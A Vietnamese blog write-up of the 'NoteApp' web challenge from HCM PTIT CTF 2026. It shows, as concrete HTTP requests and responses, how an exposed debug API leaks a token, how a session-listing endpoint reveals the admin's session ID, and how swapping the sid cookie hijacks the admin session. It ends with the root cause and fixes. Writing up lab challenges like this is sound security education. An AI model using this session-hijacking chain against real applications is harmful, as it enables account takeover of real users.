+++
title = "HCM PTIT CTF 2026 — NoteApp"
date = 2026-10-31T20:00:00+07:00
draft = false
tags = ["HCM PTIT CTF 2026", "Web", "Information Disclosure", "Session Hijacking"]
categories = ["Writeups"]
summary = "Từ robots.txt và API debug bị lộ đến việc lấy SID admin, chiếm phiên và ghép bốn mảnh flag của NoteApp."
ShowToc = true
TocOpen = false

[cover]
  image = "/images/hcm-ptit-ctf-2026.jpg"
  alt = "HCM PTIT CTF 2026"
+++

Đường giải NoteApp khá thẳng: JavaScript dẫn tới API, `robots.txt` chỉ ra khu vực nội bộ, còn cấu hình debug mở đường đến danh sách session. Không có bước nào quá khó riêng lẻ; phần quan trọng là nhận ra SID bị lộ chính là thông tin xác thực.

## Lần theo các endpoint nội bộ

Trong JavaScript phía client, ngoài request tới `/api/status` còn có ba tên module đáng chú ý:

```javascript
const API_PROBE_MODULES = ["info", "runtime", "config"];
```

Đây mới chỉ là gợi ý. Manh mối rõ hơn nằm trong `robots.txt`:

```text
User-agent: *
Disallow: /admin
Disallow: /.git/
Disallow: /internal
```

`robots.txt` không chặn truy cập. Từ `/internal` có thể lần tới trang tài liệu `/internal/docs`, nơi liệt kê `/api/probe` và `/sessions`.

Hai module `info` và `runtime` chỉ trả thông tin hệ thống, chưa giúp đi tiếp. Module `config` thì khác:

```http
GET /api/probe?module=config
```

```json
{
  "debug_token": "ptithcm_d3bug_t0k3n_9x7k",
  "part_2": "u_f0ll0w_",
  "session_cookie": "sid",
  "session_listing": "/sessions",
  "session_store": "in-memory"
}
```

Response này làm lộ cả token debug, tên cookie phiên và một mảnh flag.

## Lấy SID của admin

Dùng token vừa tìm được để gọi endpoint liệt kê session:

```http
GET /sessions?token=ptithcm_d3bug_t0k3n_9x7k
```

Trang trả về tên người dùng, vai trò và SID của mọi phiên đang hoạt động. Session của admin `dtquan` là:

```text
e1a7c3f2-8b5d-4e9b-9f3c-2d6a7b8c0e1f
```

Chỉ cần thay cookie `sid` hiện tại bằng giá trị đó:

```http
Cookie: sid=e1a7c3f2-8b5d-4e9b-9f3c-2d6a7b8c0e1f
```

Tải lại trang, ứng dụng nhận diện người dùng là `dtquan` và cho truy cập `/admin`. Nếu trình duyệt đang có một cookie `sid` cũ thì phải thay nó, không gửi hai cookie cùng tên.

## Ghép flag

Bốn mảnh nằm ở bốn vị trí khác nhau:

| Vị trí | Giá trị |
| --- | --- |
| Comment HTML ở trang chủ | `PTITHCM{d1d_y0` |
| `/api/probe?module=config` | `u_f0ll0w_` |
| `/sessions` | `th3` |
| `/admin` | `_r4bb1t}` |

Ghép theo thứ tự trên:

```text
PTITHCM{d1d_y0u_f0ll0w_th3_r4bb1t}
```

Lỗi chính không nằm ở `robots.txt`, mà ở việc các endpoint debug được để công khai và `/sessions` trả thẳng SID đang còn hiệu lực. Các thuộc tính cookie như `HttpOnly` hay `Secure` cũng không giúp được khi chính server chủ động công khai giá trị session. Cách xử lý đúng là bỏ hoặc bảo vệ endpoint liệt kê phiên, thu hồi các SID đã lộ và tách hoàn toàn cấu hình debug khỏi production.
